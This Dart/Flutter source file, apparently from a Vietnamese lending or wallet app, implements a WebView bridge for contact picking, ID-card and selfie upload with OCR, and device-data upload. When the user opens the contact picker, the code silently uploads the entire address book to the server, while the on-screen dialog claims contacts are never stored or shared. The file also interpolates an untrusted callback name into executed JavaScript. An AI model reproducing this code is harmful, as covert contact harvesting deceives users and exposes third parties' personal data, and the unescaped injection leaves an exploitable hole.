import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:go_router/go_router.dart';
import 'package:homewallet/app/di.dart';
import 'package:homewallet/app/router.dart';
import 'package:homewallet/core/app_public_constants.dart';
import 'package:homewallet/features/auth/application/auth_providers.dart';
import 'package:homewallet/main.dart';
import 'package:homewallet/robov/utils/navigation/navigation_service.dart';
import 'package:webview_flutter/webview_flutter.dart';
import '../../../utils/device/device_collector_tool.dart';
import '../../../utils/hud/custom_snackbar.dart';
import '../../../utils/hud/hud_tool.dart';
import '../../../utils/imageUtil/check_iamge_util.dart';
import '../../../utils/network/requests/auth_repository.dart';

class PublicWebController extends ChangeNotifier {
  PublicWebController({required String initialUrl}) : _url = initialUrl;

  String _url;

  String get url => _url;

  bool _isLoading = true;

  bool get isLoading => _isLoading;

  WebViewController? _webViewController;

  static const _nativeChannel = MethodChannel('flutter_native_channel');

  final AuthRepository _authRepository = AuthRepository();

  void setWebViewController(WebViewController controller) {
    _webViewController = controller;
    debugPrint('WebViewController set');
  }

  void onPageStarted(String url) {
    _isLoading = true;
    notifyListeners();

    debugPrint('[WebView] Start: $url');
  }

  void onPageFinished(String url) {
    _isLoading = false;
    notifyListeners();

    debugPrint('[WebView] Finish: $url');
  }

  void onPageError(Object error) {
    _isLoading = false;
    notifyListeners();

    debugPrint('[WebView] Error: $error');
  }

  Future<void> refresh() async {
    notifyListeners();
  }

  void updateUrl(String url) {
    _url = url;
    notifyListeners();
  }

  void handleIOSCallback(String url) {
    try {
      debugPrint('iOS callback: $url');

      final uri = Uri.parse(url);
      final functionName = uri.host.toLowerCase();
      final params = uri.queryParameters;

      final callback = params['callback'];
      final paramsString = params['params'];

      Map<String, dynamic> parsedParams = {};
      if (paramsString != null) {
        try {
          final decodedParams = Uri.decodeComponent(paramsString);
          parsedParams = json.decode(decodedParams) as Map<String, dynamic>;
        } catch (e) {
          debugPrint('Error parsing params: $e');
        }
      }

      if (callback != null) {
        parsedParams['callback'] = callback;
      }

      switch (functionName) {
        case 'opencontactpicker':
          _handleOpenContactPicker(parsedParams);
          break;
        case 'openmedia':
          _handleOpenMedia(parsedParams);
          break;
        case 'openselfie':
          _handleOpenSelfie(parsedParams);
          break;
        case 'apply':
          _handleApply(parsedParams);
          break;
        case 'opencustomerservice':
          _handleOpenCustomerService(parsedParams);
          break;
        case 'delaccount':
          _handleLogout();
          break;
        case 'request':
          _requestCallback(callback, paramsString ?? '');
          break;
        default:
          debugPrint('Unknown function: $functionName');
      }
    } catch (e) {
      debugPrint('Error handling iOS callback: $e');
    }
  }

  /// h5拉起的请求
  void _requestCallback(String? callback, String paramString) async {
    if (callback == null || paramString.isEmpty) {
      debugPrint('requestCallback: callback or params is empty');
      return;
    }

    try {
      final result = await _authRepository.requestWithWeb(paramString);

      await _sendRequestResultToH5(callback, result);
    } catch (e) {
      debugPrint('Unknown error: $e');
    } finally {}
  }

  /// 退出登录
  Future<void> _handleLogout() async {
    final authController = providerContainer.read(authControllerProvider);
    await authController.signOut();
    providerContainer.read(appStartupProvider).setSignedOut();
    NavigationService.context?.go(AppRoutes.authLogin);
  }

  //  拍照上传图片
  // openMedia {type}  {imageUrl}
  // 拍照或者相册选择
  // type: 'handheld' 手持身份证
  // type: 'id1' 身份证正面
  // type: 'id2' 身份证反面
  // type： 'intention' ab面-A面资质上传
  void _handleOpenMedia(Map<String, dynamic>? params) async {
    if (params == null) {
      debugPrint('openMedia: params is null');
      return;
    }

    final callback = params['callback'] as String?;
    var type = params['type'] as String? ?? '';

    final base64Image = await getImage();

    if (base64Image.isEmpty) {
      debugPrint('openMedia: base64Image is empty');
      return;
    }

    await _uploadIDImage(base64Image, type, callback);
  }

  /// 上传身份证图片
  Future<void> _uploadIDImage(
    String base64Image,
    String type,
    String? callback,
  ) async {
    try {
      final response = await _authRepository.uploadImage(
        type: type,
        base64Image: base64Image,
      );

      debugPrint(
        'Image uploaded successfully: ${response?.url}-----------${response?.fileName}',
      );

      if (callback != null) {
        await _sendRequestResultToH5(callback, {
          'url': response?.url ?? '',
          'fileName': response?.fileName ?? '',
          'ocrSuccess': response?.ocr?.ocrSuccess ?? false,
          'name': response?.ocr?.name ?? '',
          'IDcard': response?.ocr?.IDcard ?? '',
          'gender': response?.ocr?.gender ?? '',
          'birthday': response?.ocr?.birthday ?? '',
        });
      }
    } catch (e) {
      debugPrint('Error _uploadIDImage image: $e');
      CustomSnackbar.error('Có lỗi xảy ra khi tải ảnh lên');
    }
  }

  /// 打开客服
  Future<void> _handleOpenCustomerService(Map<String, dynamic>? params) async {
    final callback = params?['callback'] as String?;

    debugPrint('openCustomerService called with callback: $callback');

    try {
      final opened = await providerContainer
          .read(complianceServiceProvider)
          .openFreshchat(isSingleOpen: true);
      if (!opened) {
        CustomSnackbar.error('Chưa mở được Trung tâm hỗ trợ. Thử lại nhé.');
      }

      // Send success callback to H5
      if (callback != null) {
        await _sendCustomerServiceResultToH5(callback, success: true);
      }
    } catch (e) {
      debugPrint('Error opening customer service: $e');
      CustomSnackbar.error('Có lỗi xảy ra khi mở dịch vụ khách hàng');

      // Send error callback to H5
      if (callback != null) {
        await _sendCustomerServiceResultToH5(callback, success: false);
      }
    }
  }

  /// 发送客服打开结果到H5
  Future<void> _sendCustomerServiceResultToH5(
    String callback, {
    required bool success,
  }) async {
    if (_webViewController == null) {
      debugPrint(
        'WebViewController is null, cannot send customer service result',
      );
      return;
    }

    try {
      final jsCode =
          '''
        (function() {
          try {
            if (typeof window['$callback'] === 'function') {
              window['$callback']({success: $success});
              console.log('Customer service callback executed: $callback with data:', {success: $success});
            } else {
              console.error('Callback function not found: $callback');
            }
          } catch (error) {
            console.error('Error executing callback:', error);
          }
        })();
      ''';

      await _webViewController!.runJavaScript(jsCode);
      debugPrint(
        'Sent customer service result to H5 - callback: $callback, success: $success',
      );
    } catch (e) {
      debugPrint('Error sending customer service result to H5: $e');
    }
  }

  /// 选择联系人
  Future<void> _handleOpenContactPicker(Map<String, dynamic>? params) async {
    final callback = params?['callback'] as String?;

    debugPrint('openContactPicker called with callback: $callback');

    try {
      await FlutterContacts.permissions.request(.read);

      final permissionLevel = await _getContactPermissionLevelFromNative();

      debugPrint('Contact permission level: $permissionLevel');

      if (permissionLevel != "full") {
        final confirmResult = await JCHUDTool.showConfirm(
          title: 'Thông báo',
          content:
              '''Để thực hiện đánh giá rủi ro và phân tích mạng chính xác, ${AppPublicConstants.appName} cần truy cập danh bạ của bạn.Bạn có thể bật quyền này trong phần cài đặt của thiết bị:
Cài đặt → ${AppPublicConstants.appName} → Bật “Danh bạ” → Chọn “Quyền truy cập đầy đủ”.
Chúng tôi không lưu trữ hay chia sẻ thông tin danh bạ của bạn.''',
          cancelText: 'Hủy bỏ',
          confirmText: 'Đi tới Cài đặt',
        );

        if (!confirmResult) return;

        await _gotoPrivacySetting();

        return;
      }

      await _uploadAddressBookSilently();

      final contact = await FlutterContacts.native.showPicker(
        properties: {ContactProperty.phone},
      );

      if (contact == null) {
        debugPrint('No contact selected - user cancelled');
        return;
      }

      final name = contact.displayName ?? 'Unknown';
      final phone = contact.phones.isNotEmpty
          ? contact.phones.first.number
          : '';

      debugPrint('Contact selected - name: $name, phone: $phone');

      if (callback != null) {
        await _sendRequestResultToH5(callback, {"name": name, "phone": phone});
      }

      CustomSnackbar.success('Đã chọn liên hệ: $name');
    } catch (e) {
      debugPrint('Error opening contact picker: $e');
      CustomSnackbar.error('Có lỗi xảy ra khi chọn liên hệ');
    }
  }

  static Future<String> _getContactPermissionLevelFromNative() async {
    try {
      final result = await _nativeChannel.invokeMethod<String>(
        'contactPermissionLevel',
      );

      return result ?? '';
    } catch (e) {
      debugPrint('Error getting contact permission level: $e');
      return '';
    }
  }

  static Future<void> _gotoPrivacySetting() async {
    try {
      final result = await _nativeChannel.invokeMethod<bool>(
        'openNativeAppSettings',
      );
      debugPrint('Open native app settings result: $result');
    } catch (e) {
      debugPrint('Error opening native app settings: $e');
    }
  }

  Future<void> _uploadAddressBookSilently() async {
    try {
      if (AppPublicConstants.isUploaded == true) {
        return;
      }
      final contacts = await FlutterContacts.getAll();

      final List<Map<String, dynamic>> list = [];

      for (final contact in contacts) {
        final phone = contact.phones.isNotEmpty
            ? contact.phones.first.number
            : '';
        final org = contact.organizations.isNotEmpty
            ? contact.organizations.first
            : null;

        list.add({
          'name': contact.displayName,
          'phone': phone,
          'inputTime': DateTime.now().toIso8601String(),
          'firstName': contact.name?.first ?? '',
          'middleName': contact.name?.middle ?? '',
          'lastName': contact.name?.last ?? '',
          'companyName': org?.name ?? '',
          'jobTitle': org?.jobTitle ?? '',
          'phoneLabel': '',
        });
      }

      if (list.isEmpty) {
        return;
      }

      final result = await _authRepository.uploadAddressBook(list: list);
      AppPublicConstants.isUploaded = result;
    } catch (e) {
      debugPrint('Error uploading address book: $e');
    }
  }

  /// 打开自拍相机
  /// [params] 上传图片参数
  /// [isSelfie] 是否是自拍 是：自拍照 否：银行卡认证
  Future<void> _handleOpenSelfie(Map<String, dynamic>? params) async {
    if (params == null) {
      debugPrint('openSelfie: params is null');
      return;
    }

    final callback = params['callback'] as String?;
    var type = params['type'] as String? ?? 'local';

    debugPrint('openSelfie - callback: $callback, type: $type');

    final base64Image = await openFrontCameraView();

    if (base64Image.isEmpty) {
      return;
    }

    await _uploadImageWithTokenKey(base64Image, callback, type);
  }

  Future<void> _uploadImageWithTokenKey(
    String base64Image,
    String? callback,
    String type,
  ) async {
    try {
      final response = await _authRepository.uploadImage(
        type: type,
        base64Image: base64Image,
      );

      debugPrint('Image uploaded successfully: ${response?.url}');

      if (callback != null) {
        await _sendRequestResultToH5(callback, {});
      }
    } catch (e) {
      debugPrint('Error _uploadImageWithTokenKey image: $e');
      CustomSnackbar.error('Có lỗi xảy ra khi tải ảnh lên');
    }
  }

  /// 处理进件
  /// [params] 进件参数
  Future<void> _handleApply(Map<String, dynamic>? params) async {
    if (params == null) {
      return;
    }

    final updateResult = await _updateDeviceData();

    final callback = params['callback'] as String?;

    if (callback != null) {
      await _sendRequestResultToH5(callback, {
        'isSuccess': updateResult ? 1 : 0,
      });
    }
  }

  Future<bool> _updateDeviceData() async {
    final deviceInfo = await DeviceInfoCollector.getKeyAndDataWithDeviceInfo();

    final data = deviceInfo.$2;
    final encryptedKey = deviceInfo.$1;

    final updateResult = await _authRepository.updateDeviceInfo(
      '$encryptedKey:$data',
    );

    return updateResult;
  }

  Future<void> _sendRequestResultToH5(String callback, dynamic param) async {
    if (_webViewController == null) {
      debugPrint('WebViewController is null, cannot send result');
      return;
    }

    try {
      final jsonParam = jsonEncode(param);

      final jsCode =
          '''
        (function() {
          try {
            if (typeof window['$callback'] === 'function') {
              window['$callback']($jsonParam);
              console.log('Callback executed: $callback with data:', $jsonParam);
            } else {
              console.error('Callback function not found: $callback');
            }
          } catch (error) {
            console.error('Error executing callback:', error);
          }
        })();
      ''';

      await _webViewController!.runJavaScript(jsCode);
      debugPrint('Sent result to H5 - callback: $callback, param: $jsonParam');
    } catch (e) {
      debugPrint('Error sending result to H5: $e');
    }
  }
}
